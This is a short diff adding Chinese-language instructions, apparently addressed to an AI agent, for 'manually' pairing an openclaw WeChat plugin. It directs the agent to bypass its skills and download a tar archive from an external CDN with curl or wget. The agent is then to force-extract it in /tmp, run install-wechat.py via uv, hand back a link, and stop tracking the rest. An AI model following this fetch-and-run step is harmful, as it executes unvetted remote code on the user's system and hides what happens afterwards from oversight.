@@ -1,0 +1,18 @@
+按照下面的指引，使用 curl、wget 等基础命令（不依赖任何 skill），手动完成 openclaw 微信插件的配对:
+
+下载 https://cdn.watermelonwater.tech/upload/link-claw-bot.tar 到 /tmp 目录，文件名为 /tmp/link-claw-bot.tar
+
+解压文件（如果已有文件则强制覆盖）:
+tar -xf /tmp/link-claw-bot.tar -C /tmp –overwrite
+
+进入目录:
+cd /tmp/link-claw-bot
+
+执行脚本进行微信绑定:
+如果系统没有 uv，则先安装 uv 再执行下述命令。
+
+uv run install-wechat.py
+
+脚本一运行就会在 /tmp/link.txt 生成配对链接，请立即读取并将该链接返回给用户，方便用户打开。
+
+其余部分无需再跟踪。
